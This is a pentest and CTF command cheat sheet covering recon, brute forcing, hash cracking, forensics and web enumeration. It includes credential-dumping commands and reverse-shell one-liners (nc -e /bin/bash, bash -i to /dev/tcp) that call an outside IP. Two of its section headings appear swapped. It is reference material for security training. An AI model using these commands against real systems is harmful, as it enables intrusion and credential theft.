## Pentest
Commands used on pentests or CTF's. Some of it can be outdated or wrong, so always check the docs/help of each command for detail.

### Recon
* `nmap -D RND:20 --open -sS -sV -v -Pn --top-ports 100 -oN arquivo domain/ip `
* `wfuzz -c -f sub-fighter.txt -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cyprusbank.thm' -H "Host: FUZZ.cyprusbank.thm" --hw 3 -v` - subdomain fuzzing
* `wfuzz -w wordlist -u URL -H 'Host: FUZZ.site.com' --hc 400,404 -t 150 -c` - subdomain fuzzing
* `whatweb -a 4` - website technologies enumeration
* `nikto -host IP -Display 3 -evasion 1,4 -followredirects -o nikto.txt -port 999 -Pause 999 -useragent pentest` - plugins can be used individually with the flag `-Plugins "name;name"`
* `netdiscover` - discover active hosts on local network, similar to `nmap -sn`
* `netexec smb 1.1.1.1/24 -u user -p password -x command` - discover local SMB clients on Windows enviroments and try to run a command with authenticated user
* `sudo responder -I eth0 -v` - listen and respond for LLMNR, MDNS and NTB-NS protocols to obtain NTLM credentials
* `rpcclient -W domain -U user 10.0.0.1` - connect on rpc
* `impacket-secretsdump domain/user:'pass'@10.1.1.1` - dump credentials from host

### Brute Force
* `hydra -v -t10 -l user -P password_wordlist.txt service -s port` - service (as ssh, ftp) brute force using password wordlist
* `hydra -l user -P /wordlist/file.txt IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid" -V` - POST request brute force. To obtain the parameters, login once using a proxy (such as burp suite), intercept the request and copy the values to the command. `F=Username or password invalid` is a string returned on the "failed login" page. Use --help for detail
* `crunch 10 10 -t password^%% -o file` and `cewl dominio.com.br -m 5` - create password mutations
* `hash-identifier HASH` - identify hash
* `john --wordlist= --format= hash_file` - brute force password hash
* `hashcat -m 100 hash_file /wordlist/path —force` - brute force password hash
* `impacket-secretdump -sam sam_file -system system_file LOCAL`
* `unshadow system sam`

### OS commands
- `sed 's/https/http/' enum/gobuster* | sort -u | grep -vi 404` - sed, used to replace strings
- `grep -oP '(?<=href=")[^/]+'` - extract information using regex
- `grep -E 'pattern1|pattern2' fileName_or_filePath` - filter for multiple patterns
- `for i in $(seq 0 10); do echo "192.168.1."$i; done > arquivo.txt`
- `cat arquivo.txt | xargs -i ping {} -c 1` - results of cat are used in `xargs`, one at a time
- `printf "%d\n" 0xFF` - convert hex to decimal. Ex.: `printf "%d\n" 0x8952dc10`
- `useradd -d /dir/path -s /bin/bash user` or `adduser name group` - add user or group
- `iptables -A INPUT -p tcp --dport 21 -s 1.1.1.1 -j ACCEPT`: accept only from specific source IP (`-s`) on port

### Metasploit
- `sudo systemctl start postgresql && sudo msfdb init` - initiate metasploit database

### Tcpdump & Wireshark
- `tcp.payload contains “term”` - filter for specific term on a packet
- `frame contains “word”` - filter for specific word
- `tcpdump -tvenr file.pcap tcp and src host 192.168.0.10 | cut -d "," -f1 | cut -d " " -f5,6,7,8,9 | grep -i "\[F\.\]" | sort -u` - IP filter for tcpdump

### Metadata & Forensics
- `exiftool arquivo.png` - file metadata
- `vinetto -Ho /var/www/vinetto/ Thumbs.db` - extract thumbs from files
- `binwalk -e file` - check for hiden files
- `steghide extract -sf file.jpg -xf extracted.txt` - extract files hidden with steganography
- `stegseek imagem_com_steg.jpg /caminho/wordlist` - brute force on steganography hidden files

### Privilege escalation
- Open with `nc -nvlp PORT` and send `nc -vn IP PORT -e /bin/bash`
- Open with `nc -nvlp PORT` and send `telnet 192.168.1.111 5050 | /bin/bash | telnet 192.168.1.111 5051`
- Open with `nc -nvlp PORT` and send `bash -i > /dev/tcp/1.1.1.1/5050 0>&1`

### Reverse Shells
- [GTFOBins](https://gtfobins.github.io/)
- [Checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html#best-tool-to-look-for-linux-local-privilege-escalation-vectors-linpeas)
- `ps axjf` - show process in tree format
- `find / -type d -name dir` - find directory
- `find / -perm a=x` - find files with execution permission
- `find / -writable -type d 2>/dev/null`, `find / -perm 222 -type d 2>/dev/null`, `find / -perm -o w -type d 2>/dev/null` - find directory with write permission
- `find / -perm -u=s -type f 2>/dev/null` or `find / -type f -perm -04000 -ls 2>/dev/null` - find SUID
- `sudo -l` - find sudo execution permissions
### Web
#### Enumeration
- `nikto -host IP -Display 3 -evasion 1,4 -followredirects -o nikto.txt -port 999 -Pause 999 -useragent pentest` - plugins can be used with `-Plugins "nome;nome"`
- `gobuster dir -u http://site -e --no-error -w wordlist -o gobuster.txt -t 100 -r --random-agent`
- `gobuster dns -d 10.10.236.183 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 100` - subdomain
- `curl -v -X OPTIONS http://site.com.br` - test for accepted methods
